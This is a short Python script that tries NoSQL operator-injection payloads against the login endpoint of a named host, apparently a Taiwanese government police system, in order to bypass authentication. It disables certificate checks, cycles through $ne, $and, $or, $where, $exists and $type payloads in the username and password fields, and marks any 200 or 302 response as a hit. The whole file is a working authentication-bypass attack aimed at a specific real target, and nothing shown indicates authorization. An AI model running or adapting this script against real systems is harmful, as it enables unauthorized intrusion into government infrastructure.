import requests, json, urllib3, time
urllib3.disable_warnings()
BASE="https://epcr.tpf.gov.tw:4004"
def login(body,tag):
    s=requests.Session(); s.verify=False; s.headers.update({"User-Agent":"Mozilla/5.0"})
    s.get(BASE+"/captcha",timeout=12)
    try:
        r=s.post(BASE+"/login",json=body,timeout=12); return r.status_code, r.text
    except Exception as e: return None, repr(e)

print("=== 顶层 $and/$or 注入 (含 source 约束) ===")
tests={
  "username $and[src]": {"username":{"$and":[{"$ne":None},{"source":"PORTAL"}]},"password":{"$ne":None},"captcha":"1","domain":"AUTH_SERVER"},
  "$or src=PORTAL": {"$or":[{"username":{"$ne":None},"source":"PORTAL"}],"password":{"$ne":None},"captcha":"1","domain":"AUTH_SERVER"},
  "nested $where src": {"username":{"$where":"this.source=='PORTAL'"},"password":{"$ne":None},"captcha":"1","domain":"AUTH_SERVER"},
  "username $where all": {"username":{"$where":"1"},"password":{"$ne":None},"captcha":"1","domain":"AUTH_SERVER"},
  "username $exists": {"username":{"$exists":True},"password":{"$ne":None},"captcha":"1","domain":"AUTH_SERVER"},
  "username $type string": {"username":{"$type":"string"},"password":{"$ne":None},"captcha":"1","domain":"AUTH_SERVER"},
}
for tag,b in tests.items():
    code,t=login(b,tag)
    mark=" ***" if code in (200,302) else ""
    print(f"  {tag:24s} -> {code} | {t[:65]}{mark}")
    time.sleep(0.1)
print("DONE")
